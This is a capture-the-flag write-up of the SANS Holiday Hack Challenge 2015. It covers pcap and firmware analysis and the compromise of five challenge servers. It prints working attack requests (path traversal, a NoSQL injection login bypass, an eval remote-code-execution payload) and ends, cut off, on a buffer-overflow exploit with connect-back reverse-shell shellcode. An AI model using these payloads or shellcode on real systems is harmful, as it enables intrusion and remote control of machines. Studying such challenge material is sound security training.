SANS Christmas Challenge 2015
=============================
:date: 2016-01-09
:author: useless
:category: Write-up
:slug: sans-christmas-challenge-2015

.. image:: /images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png
    :alt: sans_christmas_challenge_2015_logo.png
    :align: center

This year again, the SANS institute delights us with a wonderful
`Christmas Challenge <https://holidayhackchallenge.com/2015/>`__.

We follow the `Dosis family <https://quest.holidayhackchallenge.com/>`__,
after they purchase a
`Gnome in Your Home <https://en.wikipedia.org/wiki/The_Elf_on_the_Shelf>`__
for their kids, Jessica and Joshua. These two kids, especially bright
for their age, tinker with the gnome, to find that it has a weird,
and possible illegal behaviour.

It all begins when Joshua gives us a capture file of the network
communications he recorded from the gnome...

.. contents:: Table of contents

Part 1: Dance of the Sugar Gnome Fairies: *Curious Wireless Packets*
--------------------------------------------------------------------

We're given a `PCAP file </docs/sans-christmas-challenge-2015/giyh-capture.pcap>`_ (sha256:
:code:`655541fb645af45db68a739066325e2f1138812a6893254ae7b48acd9519a330`),
and are asked to analyze it, to see what we can find.  If we open it with
Wireshark, we can see a lot of DNS traffic, with what looks
like base64-encoded data in the TXT fields.

.. image:: /images/sans-christmas-challenge-2015/giyh-capture_wireshark.png
    :alt: giyh-capture_wireshark.png
    :align: center

Using DNS requests as a communication channel with a Command and Control server
is a well known trick to bypass traffic filtering, because outbound DNS is
often authorized on a local network. So, let's extract and decode the TXT
fields. tshark is particularly adapted for this task:

.. code-block:: console

   $ tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt | base64 -d > giyh-capture_decoded.txt

Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
fields. Now, let's take a look at the decoded file:

.. code-block:: console

    $ cat giyh-capture_decoded.txt
    NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig
    EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:"DosisHome-Guest"  
    EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F   
    EXEC:          Tx-Power=20 dBm   
    EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off
    EXEC:          Encryption key:off
    EXEC:          Power Management:off
    EXEC:          
    EXEC:lo        no wireless extensions.
    EXEC:
    EXEC:eth0      no wireless extensions.
    EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt
    EXEC:START_STATEEXEC:wlan0     Scan completed :
    EXEC:          Cell 01 - Address: 00:7F:28:35:9A:C7
    EXEC:                    Channel:1
    EXEC:                    Frequency:2.412 GHz (Channel 1)
    EXEC:                    Quality=29/70  Signal level=-81 dBm  
    EXEC:                    Encryption key:on
    EXEC:                    ESSID:"CHC"
    EXEC:                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
    EXEC:                              9 Mb/s; 12 Mb/s; 18 Mb/s
    EXEC:                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
    EXEC:                    Mode:Master
    EXEC:                    Extra:tsf=000000412e67cddf
    EXEC:                    Extra: Last beacon: 5408ms ago
    EXEC:                    IE: Unknown: 00055837335A36
    EXEC:                    IE: Unknown: 010882848B960C121824
    EXEC:                    IE: Unknown: 030101
    EXEC:                    IE: Unknown: 200100
    EXEC:                    IE: IEEE 802.11i/WPA2 Version 1
    EXEC:                        Group Cipher : CCMP
    EXEC:                        Pairwise Ciphers (1) : CCMP
    EXEC:                        Authentication Suites (1) : PSK
    EXEC:                    IE: Unknown: 2A0100
    EXEC:                    IE: Unknown: 32043048606C
    EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00
    EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000
    EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000
    EXEC:                    IE: Unknown: DD0900037F01010000FF7F
    EXEC:                    IE: Unknown: DD0A00037F04010000000000
    EXEC:                    IE: Unknown: 0706555320010B1B
    [snip]
    EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg
    FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpgFILE:\xFF\xD8\xFF\xE0\x00\x10JFIF[raw binary]

Ok, lots of stuff! We can see that some shell commands are executed, and there
seems to be the upload of a JPEG file. The commands and results seem to be
:code:`EXEC:`, and the upload of the file and the content with
:code:`FILE:`.

We can recover the executed commands, which are :code:`iwconfig`, to see the
configuration of the different wirelass network interfaces of the gnome, and
:code:`cat /tmp/iwlistscan.txt`, which seems to give the result of the
:code:`iwlist scan` command, which scans available wireless networks.

We can recover the content of the uploaded file, with the following commands:

.. code-block:: console

    $ binwalk giyh-capture_decoded.txt # binwalk gives us the offset at which the JPEG file starts

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    4495          0x118F          JPEG image data, JFIF standard  1.01
    $ dd bs=1 skip=4495 if=giyh-capture_decoded.txt | sed 's/FILE://g' > giyh-capture_image.jpg # we skip the beginning of the decoded file, and remove the "FILE:" string from the result

We get the following image:

.. image:: /images/sans-christmas-challenge-2015/giyh-capture_image.jpg
    :alt: giyh-capture_image.jpg
    :align: center

The flag for this part is :code:`GnomeNET-NorthAmerica`

.. image:: /images/sans-christmas-challenge-2015/first_flag_confirmation.png
    :alt: first_flag_confirmation
    :align: center

Part 2: I’ll be Gnome for Christmas: *Firmware Analysis for Fun and Profit*
---------------------------------------------------------------------------

After seeing such a strange and creepy behaviour (come on, man, you're taking
pictures of little kids' bedrooms), we are asked to analyze the firmware of
the gnome.

We recover the `firmware </docs/sans-christmas-challenge-2015/giyh-firmware-dump.bin>`_ (sha256:
:code:`bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20`) from
Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:

.. code-block:: console

    $ binwalk giyh-firmware-dump.bin 

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PEM certificate
    1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
    168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015

Using the :code:`-e` option form binwalk, we can extract the different files,
and unsquash the file system, to get a browsable version of the file system:

.. code-block:: console

    $ binwalk -e giyh-firmware-dump.bin 

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PEM certificate
    1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
    168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015
    $ cd _giyh-firmware-dump.bin.extracted/squashfs-root
    $ ls
    bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
    $ cat etc/banner
      _______                     ________        __
     |       |.-----.-----.-----.|  |  |  |.----.|  |_
     |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
     |_______||   __|_____|__|__||________||__|  |____|
              |__| W I R E L E S S   F R E E D O M
     -----------------------------------------------------
     DESIGNATED DRIVER (Bleeding Edge, r47650)
     -----------------------------------------------------
      * 2 oz. Orange Juice         Combine all juices in a
      * 2 oz. Pineapple Juice      tall glass filled with
      * 2 oz. Grapefruit Juice     ice, stir well.
      * 2 oz. Cranberry Juice
     -----------------------------------------------------

We can see that the firmware is based on OpenWRT, more specifically the
Designated Driver branch, which is the development branch. We can find
the architecture by looking at some binary files in the :code:`bin` folder:

.. code-block:: console

    $ file bin/ash 
    bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped

The architecture of the gnome seems to be 32-bit ARM.

We can see a :code:`www` folder at the root of the file system. Let's take a
look at it:

.. code-block:: console

    $ ls
    app.js  bin  files  node_modules  package.json  public  routes  views
    $ ls views 
    cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade

The embedded web site seems to be a NodeJS website, using the Jade Node
Template Engine.

.. code-block:: console

    $ head app.js 
    var express = require('express');
    var path = require('path');
    var favicon = require('serve-favicon');
    var logger = require('morgan');
    var cookieParser = require('cookie-parser');
    var bodyParser = require('body-parser');
    var routes = require('./routes/index');
    var mongo = require('mongodb');
    var monk = require('monk');
    var db = monk('gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome')

We can see that the web site uses MongoDB as the database management system. We
can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
copy them to a local install of MongoDB so that we can analyze them:

.. code-block:: console

    $ sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
    $ sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
    $ sudo service mongodb start
    $ mongo gnome
    MongoDB shell version: 2.4.10
    connecting to: gnome
    > show collections
    cameras
    settings
    status
    system.indexes
    users
    > db.users.find()
    { "_id" : ObjectId("56229f58809473d11033515b"), "username" : "user", "password" : "user", "user_level" : 10 }
    { "_id" : ObjectId("56229f63809473d11033515c"), "username" : "admin", "password" : "SittingOnAShelf", "user_level" : 100 }

We can see that the credentials are stored in plaintext, which is a big no-no.
The credentials to connect to the gnome web interface as an administrator are
:code:`admin/SittingOnAShelf`.

The flag for this part is :code:`SittingOnAShelf`.

.. image:: /images/sans-christmas-challenge-2015/second_flag_confirmation.png
    :alt: second_flag_confirmation
    :align: center

Part 3: Let it Gnome! Let it Gnome! Let it Gnome! *Internet-Wide Scavenger Hunt*
--------------------------------------------------------------------------------

The gnomes are apparently commanded by five SuperGnomes, which are the C&C
servers. How can we identify them? Jessica tells us that we can *sho Dan* the
password information we found. It took me a while (shame on me) to understand
that it was a clue given to us to use the famous Shodan website to identify
the SuperGnomes present on the Internet.

.. image:: /images/sans-christmas-challenge-2015/jessica_shodan.png
    :alt: jessica_shodan
    :align: center

If we look back at the traffic capture from the first part of this write-up,
we can see that the gnome is communicating with a server named
cmd.sg1.atnascorp.com.

Let's take the string "atnascorp" and search it in Shodan. You can find the
result at `this URL <https://www.shodan.io/search?query=atnascorp>`_:

.. image:: /images/sans-christmas-challenge-2015/shodan_result.png
    :alt: shodan_result
    :align: center

From the traffic analysis and the results from Shodan, we have found the five
SuperGnomes:

* SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)
* SuperGnome02: 52.34.3.80, located in United States, Portland (OR)
* SuperGnome03: 52.64.191.71, located in Australia, Sydney
* SuperGnome04: 52.192.152.132, located in Japan, Tokyo
* SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo

These targets were confirmed by the Great and Powerful Oracle, Tom Hessman.

.. image:: /images/sans-christmas-challenge-2015/third_flag_confirmation.png
    :alt: third_flag_confirmation
    :align: center

No flag for this part.

Part 4: There’s No Place Like Gnome for the Holidays: *Gnomage Pwnage*
----------------------------------------------------------------------

Now, it's time to compromise these SuperGnomes! To prove that we have control
of the SuperGnomes, we must recover the content of
:code:`/gnome/www/files/gnome.conf`.

`SuperGnome01 <http://52.2.229.189/>`_
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This SuperGnome is the easiest of them all. Indeed, you just have to connect
to the web interface with the credentials found during the firmware analysis.
You can then go to the files tab, and download the configuration file:

.. image:: /images/sans-christmas-challenge-2015/sg01_w00t.png
    :alt: sg01_w00t
    :align: center

The flag for this SuperGnome is :code:`NCC1701`
(`geeky reference <https://en.wikipedia.org/wiki/USS_Enterprise_%28NCC-1701%29>`__).

`SuperGnome02 <http://52.34.3.80/>`_
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When we connect to SuperGnome02, we can go the files tab, but we can't download
any file.

.. image:: /images/sans-christmas-challenge-2015/sg02_download_fail.png
    :alt: sg02_download_fail.png
    :align: center

However, there is a path traversal vulnerability in the web backend
of the SuperGnome:

.. code-block:: js
    :hl_lines: 5 10

    // File www/route/index.js, line 182
    // CAMERA VIEWER
    // STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file
    router.get('/cam', function(req, res, next) {
      var camera = unescape(req.query.camera);
      // check for .png
      //if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
      camera = camera + '.png'; // add .png if its not found
      console.log("Cam:" + camera);
      fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
        if (e) {
                res.end('File ./public/images/' + camera + ' does not exist or access denied!');
        }
      });
      fs.readFile('./public/images/' + camera, function (e, data) {
        res.end(data);
      });
    });

We can see that the :code:`camera` parameter goes through no sanitization. The
only thing done to this parameter is that it is appended with the
:code:`'.png'` string. However, on some version of the gnome, this string is
appended only if it is not previously found in the parameter. This means that
if we find a directory with :code:`.png` in its name, we can access any file.

Fortunately, we can create a directory with an arbitray name:

.. code-block:: js
    :hl_lines: 5 6 13

    // File www/route/index.js, line 127
    // SETTINGS UPLOAD
    router.post('/settings', function(req, res, next) {
      if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // AUGGIE: settings upload allowed for admins (admins are 100, currently)
        var filen = req.body.filen;
        var dirname = '/gnome/www/public/upload/' + newdir() + '/' + filen;
        var msgs = [];
        var free = 0;
        disk.check('/', function(e, info) {
          free = info.free;
        });
        try {
          fs.mknewdir(dirname.substr(0,dirname.lastIndexOf('/')));
          msgs.push('Dir ' + dirname.substr(0,dirname.lastIndexOf('/')) + '/ created successfully!');
        } catch(e) {
          if (e.code != 'EEXIST')
            throw e;
        }
        if (free < 99999999999) { // AUGGIE: I think this is breaking uploads?  Stuart why did you set this so high?
          msgs.push('Insufficient space!  File creation error!');
        }
        res.msgs = msgs;
        next();
      } else
        res.render('index', { title: 'GIYH::ADMIN PORT V.01', session: sessions[sessionid], res: res });
    });

This time, the parameter without any sanitization is :code:`filen`, which is
the name of our new settings file. Since it's not sanitized, we can put
special characters, like :code:`/`:

.. code-block:: http

    POST /settings HTTP/1.1
    Host: 52.34.3.80
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://52.34.3.80/settings
    Cookie: sessionid=jle7GDOGWl2hB4Upp5ry
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 26

    filen=foo.png/foo&file=bar

.. image:: /images/sans-christmas-challenge-2015/sg02_folder_creation_success.png
    :alt: sg02_folder_creation_success.png
    :align: center

Then we can use the path traversal vulnerability to recover the configuration
file:

.. code-block:: http

    GET /cam?camera=../upload/YoGjNkHo/foo.png/../../../../../../gnome/www/files/gnome.conf HTTP/1.1
    Host: 52.34.3.80
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: sessionid=jle7GDOGWl2hB4Upp5ry
    Connection: close

.. code-block:: http

    HTTP/1.1 200 OK
    X-Powered-By: GIYH::SuperGnome by AtnasCorp
    Date: Sun, 20 Dec 2015 18:58:59 GMT
    Connection: close
    Content-Length: 339

    Gnome Serial Number: XKCD988
    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
    Allow new subordinates?: YES
    Camera monitoring?: YES
    Audio monitoring?: YES
    Camera update rate: 60min
    Gnome mode: SuperGnome
    Gnome name: SG-02
    Allow file uploads?: YES
    Allowed file formats: .png
    Allowed file size: 512kb
    Files directory: /gnome/www/files/

The flag for this SuperGnome is :code:`XKCD988`
(`geeky reference <https://xkcd.com/988/>`__).

`SuperGnome03 <http://52.64.191.71/>`_
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We can't even connect to this SuperGnome with our stolen credentials!

.. image:: /images/sans-christmas-challenge-2015/sg03_failed_login.png
    :alt: sg03_failed_login.png
    :align: center

That means that we have to bypass authentication somehow. The usual way is
using an SQL injection. But since the DBMS is MongoDB, we can't use traditional
SQL injection: we have to use NoSQL injection.

.. code-block:: js
    :hl_lines: 6

    // File www/routes/index.js, line 105
    // LOGIN POST
    router.post('/', function(req, res, next) {
      var db = req.db;
      var msgs = [];
      db.get('users').findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.  Really guys?
      //db.get('users').findOne({username: (req.body.username || "").toString(10), password: (req.body.password || "").toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars
        if (err || !user) {
          console.log('Invalid username and password: ' + req.body.username + '/' + req.body.password);
          msgs.push('Invalid username or password!');
          res.msgs = msgs;
          res.render('index', { title: 'GIYH::ADMIN PORT V.01', session: sessions[req.cookies.sessionid], res: res });
        } else {
          sessionid = gen_session();
          sessions[sessionid] = { username: user.username, logged_in: true, user_level: user.user_level };
          console.log("User level:" + user.user_level);
          res.cookie('sessionid', sessionid);
          res.writeHead(301,{ Location: '/' });
          res.end();
        }
      });
    });

We can see that the parameters :code:`username` and :code:`password` are not
converted to string before being used in the NoSQL query. This means that we
can send our login parameters in JSON, and they will automatically be converted
to a JavaScript object.

.. code-block:: http

    POST / HTTP/1.1
    Host: 52.64.191.71
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://52.64.191.71/?logout=1
    Cookie: sessionid=9VdoAi2pOEvmdCfZz0y9
    Connection: close
    Content-Type: application/json
    Content-Length: 45

    {"username": "admin","password": {"$gt": ""}}

.. code-block:: http

    HTTP/1.1 301 Moved Permanently
    X-Powered-By: GIYH::SuperGnome by AtnasCorp
    Set-Cookie: sessionid=5KriPZf9AP8l8MGBVpA8; Path=/
    Location: /
    Date: Sun, 20 Dec 2015 22:44:35 GMT
    Connection: close
    Content-Length: 0

This request means that the username must be "admin", and that the associated
password must be greater than an empty string. Since such a user exists, the
application considers that we provided valid credentials, and happily opens
an authenticated web session.

We can then get the configuration file:

.. code-block:: http

    GET /files?d=gnome.conf HTTP/1.1
    Host: 52.64.191.71
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://52.64.191.71/files
    Cookie: sessionid=5KriPZf9AP8l8MGBVpA8
    Connection: close

.. code-block:: http

    HTTP/1.1 200 OK
    X-Powered-By: GIYH::SuperGnome by AtnasCorp
    Date: Sun, 20 Dec 2015 22:44:57 GMT
    Connection: close
    Content-Length: 339

    Gnome Serial Number: THX1138
    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
    Allow new subordinates?: YES
    Camera monitoring?: YES
    Audio monitoring?: YES
    Camera update rate: 60min
    Gnome mode: SuperGnome
    Gnome name: SG-03
    Allow file uploads?: YES
    Allowed file formats: .png
    Allowed file size: 512kb
    Files directory: /gnome/www/files/

The flag for this SuperGnome is :code:`THX1138`
(`geeky reference <https://en.wikipedia.org/wiki/THX_1138>`__).

`SuperGnome04 <http://52.192.152.132>`_
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We can connect to this SuperGnome with our credentials (whew).
However, when we try to download the gnome.conf file from the
files tab, we get an error message:

.. image:: /images/sans-christmas-challenge-2015/sg04_download_fail.png
    :alt: sg04_download_fail.png
    :align: center

Fortunately for us, this SuperGnome suffers from a remote code execution:

.. code-block:: js
    :hl_lines: 9 15

    // File www/routes/index.js, line 153
    // FILES UPLOAD
    router.post('/files', upload.single('file'), function(req, res, next) {
      if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // NEDFORD: this should be 99 not 100 so admins can upload
        var msgs = [];
        file = req.file.buffer;
        if (req.file.mimetype === 'image/png') {
          msgs.push('Upload successful.');
          var postproc_syntax = req.body.postproc;
          console.log("File upload syntax:" + postproc_syntax);
          if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
            msgs.push('Executing post process...');
            var result;
            d.run(function() {
              result = eval('(' + postproc_syntax + ')');
            });
            // STUART: (WIP) working to improve image uploads to do some post processing.
            msgs.push('Post process result: ' + result);
          }
          msgs.push('File pending super-admin approval.');
          res.msgs = msgs;
        } else {
          msgs.push('File not one of the approved formats: .png');
          res.msgs = msgs;
        }
      } else
        res.render('index', { title: 'GIYH::ADMIN PORT V.01', session: sessions[sessionid], res: res });
      next();
    });

When a file is uploaded, it's post-processed. To do so, the server
:code:`eval` s some code sent by us. Whoopsie! We can send arbitrary JavaScript
code, and it will be executed by the server. This means that we can send code
to read the configuration file:

.. code-block:: http

    POST /files HTTP/1.1
    Host: 52.192.152.132
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: http://52.192.152.132/files
    Cookie: sessionid=X7VWEHkmmlBfutfSWIKF
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------1090026508808451371305736143
    Content-Length: 368

    -----------------------------1090026508808451371305736143
    Content-Disposition: form-data; name="postproc"

    require('fs').readFileSync('/gnome/www/files/gnome.conf', 'utf8', function (err, data) {})
    -----------------------------1090026508808451371305736143
    Content-Disposition: form-data; name="file"; filename="bar.png"
    Content-Type: image/png

    foo

    -----------------------------1090026508808451371305736143--

.. code-block:: http

    HTTP/1.1 200 OK
    X-Powered-By: GIYH::SuperGnome by AtnasCorp
    Content-Type: text/html; charset=utf-8
    Content-Length: 4208
    ETag: W/"1070-Jo7i+NGHd32e2cYWZTjmCQ"
    Date: Sat, 26 Dec 2015 23:41:46 GMT
    Connection: close

    <!DOCTYPE html><html><head><title>GIYH::ADMIN PORT V.01</title>
    [snip]
    <ul class="nav navbar-nav"><li><a href="/">Home</a></li><li><a href="/cameras">Cameras</a></li><li><a href="/files">Files</a></li><li><a href="/gnomenet">GnomeNET</a></li><li><a href="/settings">Settings</a></li><li><a href="/?logout=1">Logout</a></li></ul></div></div></nav><div class="jumbotron"><h1>Files</h1><p class="message">Upload successful.</p><p class="message">Executing post process...</p>
    <p class="message">Post process result: Gnome Serial Number: BU22_1729_2716057
    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
    Allow new subordinates?: YES
    Camera monitoring?: YES
    Audio monitoring?: YES
    Camera update rate: 60min
    Gnome mode: SuperGnome
    Gnome name: SG-04
    Allow file uploads?: YES
    Allowed file formats: .png
    Allowed file size: 512kb
    Files directory: /gnome/www/files/
    </p><p class="message">File pending Nedfords approval.</p>[snip]

.. image:: /images/sans-christmas-challenge-2015/sg04_w00t.png
    :alt: sg04_w00t.png
    :align: center

The flag for this SuperGnome is :code:`BU22_1729_2716057`
(`geeky reference <https://en.wikipedia.org/wiki/Bender_%28Futurama%29>`__).

`SuperGnome05 <http://54.233.105.81/>`_
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This SuperGnome was particular: indeed, the vulnerability was not in the
web interface, but in a network service run by the SuperGnome. If we
take a look at the result of a :code:`nmap` command, we can see that
we can connect to the SuperGnome on the port 4242:

.. code-block:: console

    $ nmap 54.233.105.81     

    Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-09 10:55 CET
    Nmap scan report for ec2-54-233-105-81.sa-east-1.compute.amazonaws.com (54.233.105.81)
    Host is up (0.30s latency).
    Not shown: 997 filtered ports
    PORT     STATE  SERVICE
    80/tcp   open   http
    4242/tcp open   vrml-multi-use
    5555/tcp closed freeciv

    Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds

Let's connect to it using :code:`netcat`:

.. code-block:: console

    $ nc 54.233.105.81 4242

    Welcome to the SuperGnome Server Status Center!
    Please enter one of the following options:

    1 - Analyze hard disk usage
    2 - List open TCP sockets
    3 - Check logged in users

Ok, this seems to be a service to get some informations about
the SuperGnomes. Let's see if we have a copy of the binary
in our copy of the firmware

.. code-block:: console

   $ grep -Rn "Welcome to the SuperGnome Server Status Center" .

   Fichier binaire ./usr/bin/sgstatd correspondant

Ok, so the binary program listening on the port 4242 seems to
be :code:`/usr/bin/sgstatd`. If we look carefully, we can
find the source for such a program on SuperGnome01:

.. image:: /images/sans-christmas-challenge-2015/sg01_file_list.png
    :alt: sg01_file_list.png
    :align: center

You can download the source code `here </docs/sans-christmas-challenge-2015/sgnet.zip>`__
(sha256: :code:`2343ce7345b960144fcb39ca01c2cf406e6db9a7847eaae6361d69ef5169d4e4`).

Now let's look at the source code, and see where our input
are being processed (I cleaned it up a bit):

.. code-block:: c
    :hl_lines: 47 51

    // File sgstatd.c, line 21
    if (choice != 2) {
        write(sd, "\nWelcome to the SuperGnome Server Status Center!\n", 51);
        write(sd, "Please enter one of the following options:\n\n", 45);
        write(sd, "1 - Analyze hard disk usage\n", 28);
        write(sd, "2 - List open TCP sockets\n", 26);
        write(sd, "3 - Check logged in users\n", 27);
        fflush(stdout);

        recv(sd, &choice, 1, 0);

        switch (choice) {
        case 49:
            fp = popen("/bin/df", "r");
            if (fp == NULL) {
                printf("Failed to run command\n");
                exit(1);
            }
            while (fgets(path, sizeof(path), fp) != NULL) {
                sgnet_writes(sd, path);

            }
            break;

        case 50:
            fp = popen("/bin/netstat -tan", "r");
            if (fp == NULL) {
                printf("Failed to run command\n");
                exit(1);
            }
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                sgnet_writes(sd, path);
            }
            break;

        case 51:
            fp = popen("/usr/bin/who", "r");
            if (fp == NULL) {
                printf("Failed to run command\n");
                exit(1);
            }
            while (fgets(path, sizeof(path) - 1, fp) != NULL) {
                sgnet_writes(sd, path);
            }
            break;

        case 88:
            write(sd, "\n\nHidden command detected!\n\n", 32);
            write(sd, "Enter a short message to share with GnomeNet (please allow 10 seconds) => ", 75);
            fflush(stdin);
            sgstatd(sd);

There seems to be a hidden command when we input :code:`88`, which is the
ASCII code of the letter :code:`X`. If we input :code:`X`, the function
:code:`sgstatd` is called. Let's take a look at it:

.. code-block:: c
    :hl_lines: 4 11 12 13

    // File sgstatd.c, line 138
    int sgstatd(sd)
    {
        __asm__("movl $0xe4ffffe4, -4(%ebp)");
        //Canary pushed

        char bin[100];
        write(sd, "\nThis function is protected!\n", 30);
        fflush(stdin);
        //recv(sd, &bin, 200, 0);
        sgnet_readn(sd, &bin, 200);
        __asm__("movl -4(%ebp), %edx\n\t" "xor $0xe4ffffe4, %edx\n\t"   // Canary checked
            "jne sgnet_exit");
        return 0;

    }

Ok, so the function :code:`sgnet_readn` seems to read data from the socket,
and stock it in a buffer. If we look at it, we can see that there is no
boundary checking. What's more, the buffer :code:`bin` only has 100 bytes
allocated, but the program reads and stores 200 bytes of data in it. Can
you say buffer-overflow!

Let's take a look at the binary, to see what kind of security it as. i'm
using the :code:`checksec.sh` (available
`here <https://github.com/slimm609/checksec.sh>`__) script to do so:

.. code-block:: console

    $ /checksec --file sgstatd
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No  0       8   sgstatd

Now, make sure you run the script on the binary from the firmware, and not
on a binary you compiled from the source code.

We can see that there is no stack canary, and that :code:`NX` is disabled.
This means that we can put our shellcode directly on the stack. Plus,
:code:`PIE` is also disabled, so we can use a gadget from our base code, and
its position will be the same on the distant binary.

Also there is no stack canary, we can see in the code from the :code:`sgstatd`
function that there is a hardcoded canary: :code:`0xe4ffffe4`. We have to
have this value in our final payload.

Now, let's find a :code:`jmp esp` gadget in our binary, so that we can continue
the flow of execution on the stack. The opcode for such an instruction is
:code:`ff e4`. If this value is familiar, it's because it's used in the custom
stack canary (clever organizers)!

.. code-block:: console

    $ objdump -M intel -d sgstatd | grep "ff e4"
     8049366:   c7 45 fc e4 ff ff e4    mov    DWORD PTR [ebp-0x4],0xe4ffffe4
     80493b2:   81 f2 e4 ff ff e4       xor    edx,0xe4ffffe4

So, our :code:`jmp esp` gadget is available at the address :code:`0x0804936b`.
Let's see the exploit code:

.. code-block:: python

    #!/usr/bin/env python

    import socket

    def main():
        # This is a connect-back shellcode, configured to connect back
        # to a server I own, on the port 8080.
        # Thanks to http://shell-storm.org/shellcode/
        shellcode = str()
        shellcode += '\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1'
        shellcode += '\xcd\x80\x92\xb0\x66\x68\x51\x39\x0B\x02\x66\x68\x1f\x90'
        shellcode += '\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80'
        shellcode += '\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b'
        shellcode += '\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
        shellcode += '\x89\xe3\xcd\x80'

